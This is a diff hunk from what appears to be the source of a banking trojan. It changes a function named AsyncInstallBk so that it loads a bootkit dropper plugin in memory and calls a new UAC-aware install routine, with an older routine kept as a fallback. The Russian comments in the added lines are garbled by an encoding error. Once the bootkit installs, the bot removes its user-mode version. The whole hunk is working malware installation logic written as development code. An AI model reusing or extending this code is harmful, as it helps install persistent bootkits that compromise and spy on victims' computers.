@@ -970,16 +970,41 @@ void AsyncInstallBk(void* Arguments)
 		PDBG("AsyncInstallBk", "MemoryLoadLibrary() result=0x%X", Module);
 		if (Module == NULL) break;
 
+		// BkDroper.plug должен импортировать ф-ции BkDrop и BkDropUac.
+		// BkDropUac - это ф-ци€ дл€ поддержки всего семейства Windows (XP/Vista/7). 
+		//             ¬ ее параметры передаетс€ тело подгруженного инстал€тора 
+		//             (то есть самого BkDroper.plug).
+		// BkDrop    - дл€ обратной совместимости (старые версии инстал€тора буткит 
+		//             содержать только ф-цию BkDrop)
+		// 
+
 		typedef BOOL (WINAPI *BkDropFunction)();
+		typedef BOOL (WINAPI *BkDropUacFunction)(const void* BkInstallBody, DWORD BkInstallBodySize);
 
 		BkDropFunction BkDrop = (BkDropFunction)MemoryGetProcAddress(Module, "BkDrop");
 		PDBG("AsyncInstallBk", "MemoryGetProcAddress('BkDrop') result=0x%X", BkDrop);
-		if (BkDrop == NULL) break;
 
-		PDBG("AsyncInstallBk", "running BkDrop.");
-		BOOL BkDropResult = BkDrop();
-		PDBG("AsyncInstallBk", "BkDrop result=%d.", BkDropResult);
+		BkDropUacFunction BkDropUac = (BkDropUacFunction)MemoryGetProcAddress(Module, "BkDropUac");
+		PDBG("AsyncInstallBk", "MemoryGetProcAddress('BkDropUac') result=0x%X", BkDrop);
 
+		if (BkDrop == NULL && BkDropUac == NULL) break;
+
+		BOOL BkDropResult = FALSE;
+		if (BkDropUac != NULL)
+		{
+			// ≈сли найдена ф-ци€ BkDropUac - то всегда будет использоватс€ она.
+			PDBG("AsyncInstallBk", "running BkDropUac.");
+			BkDropResult = BkDropUac(BkInstallPlug, BkInstallPlugSize);
+		} 
+		else if (BkDrop != NULL)
+		{
+			// ≈сли не найдена ф-ци€ BkDropUac, но найдена BkDrop - 
+			// дл€ обратной совметимости используетс€ стара€ ф-ци€.
+			PDBG("AsyncInstallBk", "running BkDrop.");
+			BkDropResult = BkDrop();
+		}
+
+		PDBG("AsyncInstallBk", "Installation result=%d.", BkDropResult);
 		if (BkDropResult == FALSE) break;
 
 		PDBG("AsyncInstallBk", "Removing ring 3 bot version.");
